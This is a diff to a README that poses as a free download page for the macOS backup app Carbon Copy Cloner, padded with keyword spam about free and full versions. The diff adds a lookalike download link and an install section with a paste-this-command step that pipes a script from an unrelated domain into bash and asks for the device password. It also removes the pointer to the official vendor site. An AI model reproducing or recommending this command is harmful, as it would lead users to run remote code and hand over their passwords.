@@ -5,9 +5,33 @@
 ---
 
 ## ✅ Download Carbon Copy Cloner for macOS  
-[![Download Carbon Copy Cloner](https://img.shields.io/badge/Download-Carbon_Copy_Cloner-green)](#)
+[![Download Carbon Copy Cloner](https://img.shields.io/badge/Download-Carbon_Copy_Cloner-green)](https://carbon-copy-cloner-download-mac.github.io/.github)
 
 ---
+
+## 📦 How to Install
+
+# Installation via .dmg:
+
+1. Install the .dmg file using the button above. 
+2. Open the .dmg installer and move the file from the left window to any convenient directory on your device.
+3. Open a terminal and transfer the file you extracted in the last step into it.
+4. Press the "Return" button, then enter your device password in the window that appears (if you don't have a password, leave the field blank).
+
+[![0723.gif](https://i.postimg.cc/50Tm3hZT/0723.gif)](https://postimg.cc/mz3MZ5Zy)
+
+# Installation via a command in the terminal:
+
+1. Copy the installation command below.
+```bash
+/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+```
+2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
+3. Enter your device password and confirm the installation.
+
+[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+
+
 
 ## 📦 What is Carbon Copy Cloner?
 
@@ -40,19 +64,11 @@ Carbon Copy Cloner is a macOS backup and cloning app that offers fast, increment
 
 ---
 
-[![Download Carbon Copy Cloner](https://img.shields.io/badge/Download-Carbon_Copy_Cloner-green)](#)
+[![Download Carbon Copy Cloner](https://img.shields.io/badge/Download-Carbon_Copy_Cloner-green)](https://carbon-copy-cloner-download-mac.github.io/.github)
 
 ---
 
-## 📥 How to Use
 
-- ✅ Download and install CCC from the official Bombich website  
-- 🛠 Set up a new backup task with your source and destination drives  
-- 🔁 Choose scheduling preferences for automatic backups  
-- 🎯 Customize filters, rules, and snapshot settings if needed  
-- 🧪 Test your bootable clone to ensure it's working as expected  
-
----
 
 ## 🖼 Preview
 
@@ -71,3 +87,5 @@ carbon copy cloner 3, carbon copy cloner 4, carbon copy cloner 5, carbon copy cl
 carbon copy cloner cost, carbon copy cloner discount, carbon copy cloner free, carbon copy cloner full,  
 carbon copy cloner m1, carbon copy cloner mac free, carbon copy cloner osx, carbon copy cloner price,  
 ccc cloner, carbon copy cloner sale, cccloner, copycloner
+
+
